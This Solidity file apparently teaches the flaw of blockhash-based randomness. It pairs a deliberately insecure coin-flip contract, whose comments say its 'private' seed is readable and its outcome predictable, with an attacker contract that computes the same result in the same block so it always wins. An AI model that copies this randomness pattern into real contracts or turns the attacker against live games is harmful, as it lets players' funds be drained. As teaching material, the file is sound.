// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract headsOrTails {

    // Possebility to win is .5 ^ 5 -> 3%

    // Global variables 
    uint public lastGame;
    bool public lastWin;
    // How many wins in a row 
    uint public consecutiveWins;

    // The seed number makes it even harder to predict the so called random number but is still hackable
    // A declared private var is only not easy to access but is still on the blockchain and not hidden at all - the information from the private variable can be seen
    uint private seed = 290837429384723984798723498723245234234234234;

    function getInfo() public view returns(uint, bytes32, uint) {
        // Look for the last blocknumber 
        uint blockNumber = block.number - 1;
        // Take hash of the blocknumber
        bytes32 hash = blockhash(blockNumber);
        // Turn the hash into an uint number 
        uint semiRandomNumber = uint(hash);

        return(blockNumber, hash, semiRandomNumber);
    }

    function flip(bool guess) public returns(bool) {

        // Local variables 
        // Test whether flipped or not 
        bool flipped;
        // Look for the last blocknumber 
        uint blockNumber = block.number - 1;
        // Take hash of the blocknumber
        bytes32 hash = blockhash(blockNumber);
        // Turn the hash into an uint number 
        uint semiRandomNumber = uint(hash);

        // Check whether the game was already played on the current blocknumber 
        require(lastGame != blockNumber, "You already played this round");

        // Sets the lastGame to the current blocknumber 
        lastGame = blockNumber;

        // Check even or odd 
        // We devid the semiRandomNumber through our seed number to make it even harder to pretict but stil show that it is predictable 
        if(semiRandomNumber / seed % 2 != 0) {
            flipped = true;
        } else {
            flipped = false;
        }

        // Check whether win or not and set the variables
        if(flipped == guess) {
            consecutiveWins += 1;
            lastWin = true;
            return true;
        } else {
            consecutiveWins = 0;
            lastWin = false;
            return false;
        }
    }
}

contract attackCoinFlip {

    // Refferencing the headsOrTails contract and set a new var as coinflipContract
    headsOrTails public coinflipConotract;

    // The seed number makes it even harder to predict the so called random number but is still hackable
    uint private seed = 290837429384723984798723498723245234234234234;

    // Sets the address of the auction contract 
    constructor(address _address) {
        coinflipConotract = headsOrTails(_address);
    }

    function tryToWin() public {
        // Look for the last blocknumber 
        uint blockNumber = block.number - 1;
        // Take hash of the blocknumber
        bytes32 hash = blockhash(blockNumber);
        // Turn the hash into an uint number 
        uint semiRandomNumber = uint(hash);

        // Always win the even or odd game - hack
        // We devid the semiRandomNumber through our seed number to make it even harder to pretict but stil show that it is predictable 
        if(semiRandomNumber / seed % 2 != 0) {
            // Based on the already known outcome from the headsOrTail contract, flip the outcome for the necessary win 
            coinflipConotract.flip(true);
        } else {
            // Based on the already known outcome from the headsOrTail contract, flip the outcome for the necessary win 
            coinflipConotract.flip(false);
        }
    }

}